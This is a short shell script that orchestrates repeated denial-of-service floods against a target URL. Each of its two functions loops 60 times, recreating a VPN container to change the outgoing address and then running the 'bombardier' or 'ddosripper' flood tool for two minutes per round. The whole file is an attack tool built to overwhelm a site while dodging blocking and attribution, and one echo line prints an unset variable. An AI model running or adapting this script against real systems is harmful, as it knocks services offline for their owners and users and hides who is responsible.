#!/bin/sh

bombardier()
{
    export VPN_CODE=$2
    export TARGET_URL=$1
    for i in {1..60}
    do
        echo "Running bombardier $i time. $VPN_CODE $B_TARGET"
        sudo -E docker-compose down
        sudo -E docker-compose up -d --force-recreate vpn 
        sleep 10s
        sudo -E docker-compose run test
        sudo -E docker-compose run -d bombardier
        echo "Executing..."
        sleep 120s
        sudo -E docker-compose down
    done
}

ddosripper()
{
    export VPN_CODE=$2
    export TARGET_URL=$1
    for i in {1..60}
    do
        echo "Running ddosripper $i time. $VPN_CODE $B_TARGET"
        sudo -E docker-compose down
        sudo -E docker-compose up -d --force-recreate vpn 
        sleep 10s
        sudo -E docker-compose run test
        sudo -E docker-compose run -d ddosripper
        echo "Executing..."
        sleep 120s
        sudo -E docker-compose down
    done
}